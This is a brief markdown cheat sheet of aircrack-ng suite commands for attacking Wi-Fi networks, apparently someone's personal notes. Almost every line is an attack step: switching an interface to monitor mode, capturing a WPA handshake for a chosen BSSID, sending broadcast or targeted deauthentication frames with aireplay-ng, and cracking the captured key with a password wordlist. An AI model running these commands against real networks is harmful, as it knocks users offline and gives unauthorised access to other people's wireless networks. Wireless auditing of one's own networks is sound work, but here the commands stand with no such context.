# Aircrack comand

See available wireless network interface to use

```airmon-ng```
Config wireless interface in mod monitor

```airmon-ng start wlan0```

Capture network info

```airodump-ng wlan0``` 

Capture networks info specifiying the chanel and de BSSID, (Also save the handshake in file id record)

```airodump-ng -c6 --bssid [MAC-addres] --write WPAPRueba  wlan0```

Record and write results to csv format

```airodump-ng wlan0 -w wlan_0 --output-format csv```

Deautenticate in mode in broadcast

```aireplay-ng --deauth 100 -a [bssid] wlan0```

Deauthenticate a concret client

```aireplay-ng -0 1 -a [bssid] -c [MAC-addres]  wlan0```

Decrypt key

```aircrack-ng -w password.lst -b [MAC-addres] psk*.cap```


